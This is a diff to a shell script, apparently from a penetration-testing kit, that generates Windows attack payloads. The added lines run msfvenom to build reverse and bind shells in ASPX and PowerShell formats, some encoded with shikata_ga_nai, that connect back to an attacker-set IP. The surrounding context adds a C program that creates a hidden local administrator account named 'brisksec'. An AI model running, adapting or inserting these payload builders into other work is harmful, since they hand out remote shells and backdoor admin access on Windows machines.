@@ -28,6 +28,11 @@ cd public/payloads_windows
         echo ""
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp
 
+        banner "payloads_windows: shell_reverse_tcp_*.aspx"
+        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f aspx > shell_reverse_tcp_x86.aspx
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f aspx > shell_reverse_tcp_x64.aspx
+
         banner "payloads_windows: shell_reverse_tcp_*.js_le"
         msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
         echo ""
@@ -39,9 +44,14 @@ cd public/payloads_windows
         msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x64.python
 
         banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.bin"
-        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
+        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
         echo ""
-        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread --format raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin    
+        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin
+
+        banner "payloads_windows: shell_reverse_tcp_*.ps1"
+        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread  -f psh -o shell_reverse_tcp_x86.ps1
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f psh -o shell_reverse_tcp_x64.ps1   
             
         # Bind shells
         banner "payloads_windows: shell_reverse_tcp_*.exe"
@@ -59,6 +69,12 @@ cd public/payloads_windows
         echo ""
         msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp
 
+
+        banner "payloads_windows: shell_bind_tcp_*.aspx"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f aspx > shell_bind_tcp_x86.aspx
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f aspx > shell_bind_tcp_x64.aspx
+
         banner "payloads_windows: shell_bind_tcp_*.js_le"
         msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
         echo ""
@@ -70,9 +86,14 @@ cd public/payloads_windows
         msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x64.python
 
         banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.bin"
-        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port -f raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
         echo ""
-        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port -f raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin
+
+        banner "payloads_windows: shell_bind_tcp_*.ps1"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f psh > shell_bind_tcp_x86.ps1
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f psh > shell_bind_tcp_x64.ps1
 
 
 banner "payloads_windows: asptest.asp.config"
@@ -220,7 +241,8 @@ int i;
 i=system ("net user brisksec brisksec /add & net localgroup administrators brisksec /add"); return 0;
 }
 EOT
-i686-w64-mingw32-gcc -o useradd.exe useradd.c
+i686-w64-mingw32-gcc -o useradd.exe -lws2_32 useradd.c
+# echo -e '#include <stdio.h>\n#include <smain () {\nsystem("net user brisksec brisksec /add & net localgroup administrators brisksec /add");\nreturn(0);\n}'> poc.c
 
         # Create all common shells in payloads_windows folder
         bash ../../_setup/setup_payloads.sh
